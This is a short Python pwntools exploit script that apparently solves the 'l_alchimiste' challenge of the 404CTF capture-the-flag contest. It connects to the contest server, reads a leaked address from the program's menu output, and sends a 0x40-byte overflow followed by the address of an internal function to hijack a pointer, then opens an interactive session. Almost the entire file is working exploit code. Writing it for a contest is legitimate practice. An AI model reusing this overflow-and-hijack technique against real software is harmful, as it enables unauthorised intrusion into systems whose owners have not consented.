#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('l_alchimiste')

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 30944)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendlineafter(b'>>> ',b'1')
io.recvuntil(b'***** ~ ')
leak = int(io.recvline(),16)

log.success(f'{leak = :x}')

for i in range(4):
    io.sendlineafter(b'>>> ',b'2')

    io.sendlineafter(b'>>> ',b'3')
    io.sendlineafter(b'[Vous] : ', b'toto')

io.sendlineafter(b'>>> ',b'2')
io.sendlineafter(b'>>> ',b'3')
io.sendafter(b'[Vous] : ', b'A'*0x40 + p64(exe.sym['incInt']))

for i in range(10):
    io.sendlineafter(b'>>> ',b'2')

    io.sendlineafter(b'>>> ',b'3')
    io.sendlineafter(b'[Vous] : ', b'toto')



io.interactive()

